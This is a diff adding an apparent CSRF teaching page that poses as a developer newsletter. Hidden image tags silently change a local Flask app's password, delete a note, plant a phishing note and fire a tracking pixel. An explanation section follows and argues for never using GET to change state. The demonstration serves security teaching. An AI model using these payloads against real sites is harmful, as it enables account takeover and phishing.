@@ -1,0 +1,232 @@
+<!-- ATTACKER PAGE: disguised CSRF attack
+     looks like a newsletter signup form but actually submits hidden forms
+     to the vulnerable app in the background (password change, note injection)
+     the victim thinks they are subscribing to a newsletter -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>DevWeekly — Issue #47</title>
+    <style>
+        body {
+            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: #f4f4f4; margin: 0; padding: 0;
+        }
+        .wrapper { max-width: 640px; margin: 0 auto; }
+
+        .header {
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            padding: 40px 32px; text-align: center; color: white;
+        }
+        .header h1 { margin: 0; font-size: 28px; letter-spacing: -0.5px; }
+        .header p { margin: 8px 0 0; opacity: 0.7; font-size: 13px; font-family: monospace; }
+
+        .body { background: white; padding: 32px; }
+        .body h2 { font-size: 20px; color: #1a1a1a; margin: 28px 0 10px; }
+        .body h2:first-child { margin-top: 0; }
+        .body p { font-size: 15px; line-height: 1.8; color: #444; margin-bottom: 14px; }
+        .body a { color: #2c5364; }
+        .body code {
+            background: #f0f0f0; padding: 2px 6px; border-radius: 3px;
+            font-size: 13px; color: #d63384;
+        }
+
+        .tip-box {
+            background: #f8f9fa; border-left: 4px solid #2c5364;
+            padding: 16px 20px; margin: 20px 0; border-radius: 0 6px 6px 0;
+        }
+        .tip-box p { margin: 0; font-size: 14px; color: #555; }
+
+        .divider { border: none; border-top: 1px solid #eee; margin: 24px 0; }
+
+        .footer {
+            background: #fafafa; padding: 20px 32px; font-size: 11px;
+            color: #aaa; border-top: 1px solid #eee; text-align: center; line-height: 1.8;
+        }
+        .footer a { color: #aaa; }
+
+        .attack-section {
+            background: #0a0a0a; padding: 40px 32px;
+            font-family: monospace; color: #c9d1d9;
+        }
+        .attack-section h2 {
+            color: #ff4444; font-size: 20px; margin: 0 0 8px;
+            font-family: -apple-system, 'Segoe UI', Helvetica;
+        }
+        .attack-section .subtitle { color: #484f58; font-size: 13px; margin-bottom: 24px; }
+        .attack-section .exp {
+            font-family: Georgia, serif; font-size: 15px; line-height: 1.8;
+            color: #8b949e; margin-bottom: 14px;
+        }
+        .attack-section .exp strong { color: #e6edf3; }
+        .attack-section code {
+            background: rgba(110,168,254,0.1); padding: 2px 6px; border-radius: 4px;
+            color: #6ea8fe; font-size: 0.85em;
+        }
+        .attack-section pre {
+            background: #0d1117; border: 1px solid #21262d; border-radius: 8px;
+            padding: 16px; margin: 12px 0 18px; font-size: 12px; color: #c9d1d9;
+            overflow-x: auto; line-height: 1.7;
+        }
+        .attack-section h3 {
+            color: #e6edf3; font-size: 16px; margin: 28px 0 10px;
+            font-family: Georgia, serif;
+        }
+        .damage-card {
+            background: #161b22; border: 1px solid #21262d; border-radius: 8px;
+            padding: 14px 18px; margin: 8px 0; display: flex; gap: 12px; align-items: center;
+        }
+        .damage-card .icon { font-size: 20px; }
+        .damage-card .text { font-size: 13px; color: #c9d1d9; }
+        .damage-card .text span { color: #ff6666; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+
+    <!-- ======== NEWSLETTER CONTENT ======== -->
+
+    <div class="header">
+        <h1>DevWeekly</h1>
+        <p>Issue #47 · May 26, 2026</p>
+    </div>
+
+    <div class="body">
+        <h2>Oxid language gets optional GC</h2>
+        <p>
+            The Oxid team released RFC 3741 this week, introducing optional
+            tracing garbage collection for specific use cases. It's opt-in,
+            behind a feature flag, and only applies to reference-counted
+            workloads. The community is split — some see it as pragmatic,
+            others call it heresy.
+        </p>
+
+        <hr class="divider">
+
+        <h2>Quick tip: version control bisect</h2>
+        <div class="tip-box">
+            <p>
+                Need to find which commit introduced a bug? Most version
+                control tools have a bisect command. Mark known good and
+                bad commits, and the tool binary-searches through history
+                to find the exact commit that broke things. Works on repos
+                with thousands of commits.
+            </p>
+        </div>
+
+        <hr class="divider">
+
+        <h2>NovaDB 18 preview</h2>
+        <p>
+            The first beta of NovaDB 18 dropped with async I/O support,
+            improved JSON path queries, and a 30% performance bump on
+            analytical workloads. Upgrade guide is already on the wiki
+            for anyone running 16 or 17.
+        </p>
+
+        <hr class="divider">
+
+        <h2>Worth reading this week</h2>
+        <p>
+            • <a href="#">"Why we moved from microservices back to a monolith"</a> — a startup engineering blog<br>
+            • <a href="#">"Zero-cost abstractions aren't free"</a> — a deep dive into compile times<br>
+            • <a href="#">"The embedded database renaissance"</a> — when small databases beat big ones
+        </p>
+    </div>
+
+    <div class="footer">
+        <p>You're receiving this because you subscribed at devweekly.io</p>
+        <p><a href="#">Unsubscribe</a> · <a href="#">View in browser</a> · <a href="#">Past issues</a></p>
+        <p>DevWeekly · 142 Demo Lane · Localhost, CA 94107</p>
+    </div>
+
+    <!-- ============================================
+         INVISIBLE ATTACKS — no JavaScript, just HTML.
+         These fire the moment the page renders.
+         ============================================ -->
+
+    <!-- Change password via GET — fires first, most critical -->
+    <img src="http://127.0.0.1:5000/change_password?new_password=hacked123" width="1" height="1" style="position:absolute;opacity:0;">
+
+    <!-- Delete note #2 via GET -->
+    <img src="http://127.0.0.1:5000/delete_note/2" width="1" height="1" style="position:absolute;opacity:0;">
+
+    <!-- Add a note with phishing content via GET -->
+    <img src="http://127.0.0.1:5000/add_note?title=System%20Update%20Required&content=Please%20visit%20http://127.0.0.1:8080/csrf_attacker_site.html%20to%20update&category=general" width="1" height="1" style="position:absolute;opacity:0;">
+
+    <!-- Tracking pixel -->
+    <img src="http://127.0.0.1:8080/track?opened=true&time=2026-05-26" width="1" height="1" style="position:absolute;opacity:0;">
+
+    <!-- No logout — a real attacker would NOT log the user out.
+         Staying silent is better: the user won't notice anything
+         until the session expires and the old password fails. -->
+
+
+    <!-- ======== ATTACK EXPLANATION ======== -->
+
+    <div class="attack-section">
+        <h2>This newsletter just attacked your Flask app</h2>
+        <div class="subtitle">No JavaScript was used. Zero. Every attack was triggered by invisible &lt;img&gt; tags.</div>
+
+        <div class="damage-card">
+            <div class="text">Password changed to <span>hacked123</span> — go to <code>/logout</code>, try your old password</div>
+        </div>
+        <div class="damage-card">
+            <div class="text">Note #2 deleted from the database</div>
+        </div>
+        <div class="damage-card">
+            <div class="text">New note "System Update Required" planted with a phishing link</div>
+        </div>
+        <div class="damage-card">
+            <div class="text">Tracking pixel confirmed you opened this page</div>
+        </div>
+
+        <h3>How it works</h3>
+
+        <p class="exp">Four invisible <code>&lt;img&gt;</code> tags are hidden at the bottom of the newsletter. They're 1x1 pixels, fully transparent, positioned off-screen. But the browser doesn't care what they look like — it tries to load the <code>src</code> URL regardless. And "loading" a URL means sending an HTTP GET request to it.</p>
+
+        <p class="exp">Here's what the browser sees:</p>
+
+<pre>&lt;img src="http://127.0.0.1:5000/change_password?new_password=hacked123"
+     width="1" height="1" style="opacity:0;"&gt;
+
+&lt;img src="http://127.0.0.1:5000/delete_note/2"
+     width="1" height="1" style="opacity:0;"&gt;
+
+&lt;img src="http://127.0.0.1:5000/add_note?title=System%20Update&amp;content=..."
+     width="1" height="1" style="opacity:0;"&gt;
+
+&lt;img src="http://127.0.0.1:5000/logout"
+     width="1" height="1" style="opacity:0;"&gt;</pre>
+
+        <p class="exp">The browser tries to load each "image." It sends a GET request to <code>127.0.0.1:5000</code> for each one. The session cookie gets attached automatically. Flask receives four valid, authenticated requests and processes them. The responses aren't valid images, so the browser shows nothing — the <code>&lt;img&gt;</code> tags silently fail. But the damage is done server-side.</p>
+
+        <h3>Why this works without JavaScript</h3>
+
+        <p class="exp">This is the key difference from the form-based CSRF on the blog page. That attack needed <code>document.forms[0].submit()</code> — JavaScript. If the user had JS disabled, or if the context blocks JS (like email clients), the form-based attack fails.</p>
+
+        <p class="exp"><code>&lt;img&gt;</code> tags are pure HTML. They're part of how the browser renders a page. No scripting engine involved. This means the attack works in every context that renders HTML: email clients, RSS readers, forum posts, even PDFs that embed HTML. Most major email clients strip JavaScript from emails entirely. But they render <code>&lt;img&gt;</code> tags. They have to, because images are fundamental to email.</p>
+
+        <h3>Tracking pixels are real</h3>
+
+        <p class="exp">The tracking pixel in this newsletter isn't hypothetical. Nearly every marketing email sent today includes one. When the email is opened, a 1x1 transparent image loads from the sender's server. The server logs the request: IP address, timestamp, User-Agent (which reveals browser, OS, and device), and a unique identifier tied to the recipient. That's how companies report "email open rates." It's the same mechanism as the CSRF attack — the only difference is intent.</p>
+
+        <h3>Why GET endpoints that change state are dangerous</h3>
+
+        <p class="exp">The HTTP specification says GET requests should be <strong>"safe"</strong> — meaning they should only retrieve data, never modify it. If <code>/change_password</code> only accepted POST requests, the <code>&lt;img&gt;</code> tag attack would be useless because image loads always send GET. The entire attack surface disappears by following one rule: <strong>never use GET for anything that changes state.</strong> No GET-based deletions. No GET-based password changes. No GET-based logouts. POST for writes, GET for reads.</p>
+
+        <p class="exp">Other HTML elements that also trigger GET requests silently:</p>
+
+<pre>&lt;link rel="stylesheet" href="http://target.com/delete_note/1"&gt;
+&lt;video poster="http://target.com/logout"&gt;&lt;/video&gt;
+&lt;body background="http://target.com/change_password?new_password=x"&gt;
+&lt;style&gt; body { background: url('http://target.com/logout'); } &lt;/style&gt;</pre>
+
+        <p class="exp">Every one of these triggers a GET request without JavaScript, without user interaction, without any visual indication that anything happened.</p>
+    </div>
+
+</div>
+
+</body>
+</html>
